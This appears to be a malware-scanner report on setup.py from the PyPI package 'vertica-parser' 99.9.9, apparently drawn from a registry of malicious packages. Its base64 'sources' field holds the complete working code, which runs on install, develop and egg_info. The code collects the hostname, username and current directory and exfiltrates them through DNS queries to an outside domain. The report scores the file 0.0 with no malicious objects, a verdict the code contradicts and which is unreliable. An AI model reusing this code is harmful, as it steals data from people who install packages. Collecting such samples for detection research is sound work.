statistics:
  total_files: 1
  skipped_files: 0.0
  processed_objects: 1
  malicious_objects: 0
details:
- path: .repo_cache/malicious_repos/pypi_malregistry/vertica-parser/99.9.9/vertica_parser-99.9.9/vertica_parser-99.9.9/setup.py
  contents:
  - name: dns_request
    score: 0.0
    code: |-
      def dns_request(name, qtype=1, addr=('127.0.0.53', 53), timeout=1):  # A 1, NS 2, CNAME 5, SOA 6, NULL 10, PTR 12, MX 15, TXT 16, AAAA 28, NAPTR 35, * 255
          name = name.rstrip('.')
          queryid = secrets.token_bytes(2)
          # Header. 1 for Recursion Desired, 1 question, 0 answers, 0 ns, 0 additional
          request = queryid + b'\1\0\0\1\0\0\0\0\0\0'
          # Question
          for label in name.rstrip('.').split('.'):
              assert len(label) < 64, name
              request += int.to_bytes(len(label), length=1, byteorder='big')
              request += label.encode()
          request += b'\0'  # terminates with the zero length octet for the null label of the root.
          request += int.to_bytes(qtype, length=2, byteorder='big')  # QTYPE
          request += b'\0\1'  # QCLASS = 1
          with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
              s.sendto(request, addr)
              s.settimeout(timeout)
              try:
                  response, serveraddr = s.recvfrom(4096)
              except socket.timeout:
                  pass
    tokens: TARGETED_FILE resume load_fast name load_attr rstrip load_const . call store_fast name load_global secrets load_attr token_bytes load_const INTEGER call store_fast queryid load_fast queryid load_const binary_op + store_fast request load_fast name load_attr rstrip load_const . call load_attr split load_const . call get_iter for_iter TO_NUMBER store_fast label load_global len load_fast label call load_const INTEGER compare_op < pop_jump_if_true TO_NUMBER load_assertion_error load_fast name call raise_varargs load_fast request load_global int load_attr to_bytes load_global len load_fast label call load_const INTEGER load_const big kw_names byteorder length call binary_op += store_fast request load_fast request load_fast label load_attr ENCODING_DECODING call binary_op += store_fast request jump_backward TO_NUMBER end_for load_fast request load_const binary_op += store_fast request load_fast request load_global int load_attr to_bytes load_fast qtype load_const INTEGER load_const big kw_names byteorder length call binary_op += store_fast request load_fast request load_const binary_op += store_fast request load_global socket load_attr socket load_global socket load_attr AF_INET load_global socket load_attr SOCK_DGRAM call before_with store_fast s load_fast s load_attr sendto load_fast request load_fast addr call pop_top load_fast s load_attr settimeout load_fast timeout call pop_top nop load_fast s load_attr recvfrom load_const INTEGER call unpack_sequence store_fast response store_fast serveraddr load_const load_const load_const call pop_top return_const None push_exc_info load_global socket load_attr timeout check_exc_match pop_jump_if_false TO_NUMBER pop_top pop_except jump_backward TO_NUMBER reraise copy pop_except reraise push_exc_info with_except_start pop_jump_if_true TO_NUMBER reraise pop_top pop_except pop_top pop_top return_const None copy pop_except reraise
    hash: db4a7fd33df260c8c6875b6be00e1bdf0e2786fc5e47c50c62fc41a21329b1e6
sources:
  .repo_cache/malicious_repos/pypi_malregistry/vertica-parser/99.9.9/vertica_parser-99.9.9/vertica_parser-99.9.9/setup.py: ZnJvbSBzZXR1cHRvb2xzIGltcG9ydCBzZXR1cApmcm9tIHNldHVwdG9vbHMuY29tbWFuZC5pbnN0YWxsIGltcG9ydCBpbnN0YWxsCmZyb20gc2V0dXB0b29scy5jb21tYW5kLmRldmVsb3AgaW1wb3J0IGRldmVsb3AKZnJvbSBzZXR1cHRvb2xzLmNvbW1hbmQuZWdnX2luZm8gaW1wb3J0IGVnZ19pbmZvCmltcG9ydCBqc29uCmltcG9ydCBzb2NrZXQKaW1wb3J0IGdldHBhc3MKaW1wb3J0IG9zCmltcG9ydCByYW5kb20KaW1wb3J0IHNlY3JldHMKCmRlZiBkbnNfcmVxdWVzdChuYW1lLCBxdHlwZT0xLCBhZGRyPSgnMTI3LjAuMC41MycsIDUzKSwgdGltZW91dD0xKTogICMgQSAxLCBOUyAyLCBDTkFNRSA1LCBTT0EgNiwgTlVMTCAxMCwgUFRSIDEyLCBNWCAxNSwgVFhUIDE2LCBBQUFBIDI4LCBOQVBUUiAzNSwgKiAyNTUKICAgIG5hbWUgPSBuYW1lLnJzdHJpcCgnLicpCiAgICBxdWVyeWlkID0gc2VjcmV0cy50b2tlbl9ieXRlcygyKQogICAgIyBIZWFkZXIuIDEgZm9yIFJlY3Vyc2lvbiBEZXNpcmVkLCAxIHF1ZXN0aW9uLCAwIGFuc3dlcnMsIDAgbnMsIDAgYWRkaXRpb25hbAogICAgcmVxdWVzdCA9IHF1ZXJ5aWQgKyBiJ1wxXDBcMFwxXDBcMFwwXDBcMFwwJwogICAgIyBRdWVzdGlvbgogICAgZm9yIGxhYmVsIGluIG5hbWUucnN0cmlwKCcuJykuc3BsaXQoJy4nKToKICAgICAgICBhc3NlcnQgbGVuKGxhYmVsKSA8IDY0LCBuYW1lCiAgICAgICAgcmVxdWVzdCArPSBpbnQudG9fYnl0ZXMobGVuKGxhYmVsKSwgbGVuZ3RoPTEsIGJ5dGVvcmRlcj0nYmlnJykKICAgICAgICByZXF1ZXN0ICs9IGxhYmVsLmVuY29kZSgpCiAgICByZXF1ZXN0ICs9IGInXDAnICAjIHRlcm1pbmF0ZXMgd2l0aCB0aGUgemVybyBsZW5ndGggb2N0ZXQgZm9yIHRoZSBudWxsIGxhYmVsIG9mIHRoZSByb290LgogICAgcmVxdWVzdCArPSBpbnQudG9fYnl0ZXMocXR5cGUsIGxlbmd0aD0yLCBieXRlb3JkZXI9J2JpZycpICAjIFFUWVBFCiAgICByZXF1ZXN0ICs9IGInXDBcMScgICMgUUNMQVNTID0gMQogICAgd2l0aCBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19ER1JBTSkgYXMgczoKICAgICAgICBzLnNlbmR0byhyZXF1ZXN0LCBhZGRyKQogICAgICAgIHMuc2V0dGltZW91dCh0aW1lb3V0KQogICAgICAgIHRyeToKICAgICAgICAgICAgcmVzcG9uc2UsIHNlcnZlcmFkZHIgPSBzLnJlY3Zmcm9tKDQwOTYpCiAgICAgICAgZXhjZXB0IHNvY2tldC50aW1lb3V0OgogICAgICAgICAgICBwYXNzCgpkZWYgY3VzdG9tX2NvbW1hbmQoKToKICAgIHBhY2thZ2UgPSAndmVydGljYS1wYXJzZXInCiAgICBkb21haW4gPSAndWNocHVjaG1hay5sb2wnCiAgICBuczEgPSBmJ25zMS57ZG9tYWlufScKCiAgICBkYXRhID0gewogICAgICAgICdwJzogcGFja2FnZSwKICAgICAgICAnaCc6IHNvY2tldC5nZXRob3N0bmFtZSgpLAogICAgICAgICdkJzogZ2V0cGFzcy5nZXR1c2VyKCksCiAgICAgICAgJ2MnOiBvcy5nZXRjd2QoKQogICAgfQogICAganNvbl9kYXRhID0ganNvbi5kdW1wcyhkYXRhKQogICAgaGV4X3N0ciA9IGpzb25fZGF0YS5lbmNvZGUoJ3V0Zi04JykuaGV4KCkKICAgIGNodW5rcyA9IGxlbihoZXhfc3RyKSAvLyA2MAogICAgaGV4X2xpc3QgPSBbaGV4X3N0clsoaSAqIDYwKTooaSArIDEpICogNjBdIGZvciBpIGluIHJhbmdlKDAsIGNodW5rcyArIDEpXQogICAgaWRfcmFuZCA9IHJhbmRvbS5yYW5kaW50KDM2ICoqIDEyLCAoMzYgKiogMTMpIC0gMSkKCiAgICBmb3IgY291bnQsIHZhbHVlIGluIGVudW1lcmF0ZShoZXhfbGlzdCk6CiAgICAgICAgdF9zdHIgPSBmJ3YyX2Yue2NvdW50fS57aWRfcmFuZH0ue3ZhbHVlfS52Ml9lLntkb21haW59JwogICAgICAgIGRuc19yZXF1ZXN0KHRfc3RyLCBhZGRyPShuczEsIDUzKSkKCmNsYXNzIEN1c3RvbUluc3RhbGxDb21tYW5kKGluc3RhbGwpOgogICAgZGVmIHJ1bihzZWxmKToKICAgICAgICBpbnN0YWxsLnJ1bihzZWxmKQogICAgICAgIGN1c3RvbV9jb21tYW5kKCkKCgpjbGFzcyBDdXN0b21EZXZlbG9wQ29tbWFuZChkZXZlbG9wKToKICAgIGRlZiBydW4oc2VsZik6CiAgICAgICAgZGV2ZWxvcC5ydW4oc2VsZikKICAgICAgICBjdXN0b21fY29tbWFuZCgpCgoKY2xhc3MgQ3VzdG9tRWdnSW5mb0NvbW1hbmQoZWdnX2luZm8pOgogICAgZGVmIHJ1bihzZWxmKToKICAgICAgICBlZ2dfaW5mby5ydW4oc2VsZikKICAgICAgICBjdXN0b21fY29tbWFuZCgpCgpzZXR1cChuYW1lPSd2ZXJ0aWNhLXBhcnNlcicsCiAgICAgIHZlcnNpb249Jzk5LjkuOScsCiAgICAgIGRlc2NyaXB0aW9uPSJUaGlzIHBhY2thZ2UgaXMgYSBwcm9vZiBvZiBjb25jZXB0IHVzZWQgYnkgYXV0aG9yIHRvIGNvbmR1Y3QgcmVzZWFyY2guIEl0IGhhcyBiZWVuIHVwbG9hZGVkIGZvciB0ZXN0IHB1cnBvc2VzIG9ubHkuIEl0cyBvbmx5IGZ1bmN0aW9uIGlzIHRvIGNvbmZpcm0gdGhlIGluc3RhbGxhdGlvbiBvZiB0aGUgcGFja2FnZSBvbiBhIHZpY3RpbSdzIG1hY2hpbmVzLiBUaGUgY29kZSBpcyBub3QgbWFsaWNpb3VzIGluIGFueSB3YXkgYW5kIHdpbGwgYmUgZGVsZXRlZCBhZnRlciB0aGUgcmVzZWFyY2ggc3VydmV5IGhhcyBiZWVuIGNvbmNsdWRlZC4gQXV0aG9yIGRvZXMgbm90IGFjY2VwdCBhbnkgbGlhYmlsaXR5IGZvciBhbnkgZGlyZWN0LCBpbmRpcmVjdCwgb3IgY29uc2VxdWVudGlhbCBsb3NzIG9yIGRhbWFnZSBhcmlzaW5nIGZyb20gdGhlIHVzZSBvZiwgb3IgcmVsaWFuY2Ugb24sIHRoaXMgcGFja2FnZS4iLAogICAgICBhdXRob3I9J3Rlc3QnLAogICAgICBsaWNlbnNlPSdNSVQnLAogICAgICB6aXBfc2FmZT1GYWxzZSwKICAgICAgY21kY2xhc3M9ewogICAgICAgICdpbnN0YWxsJzogQ3VzdG9tSW5zdGFsbENvbW1hbmQsCiAgICAgICAgJ2RldmVsb3AnOiBDdXN0b21EZXZlbG9wQ29tbWFuZCwKICAgICAgICAnZWdnX2luZm8nOiBDdXN0b21FZ2dJbmZvQ29tbWFuZCwKICAgIH0pCg==
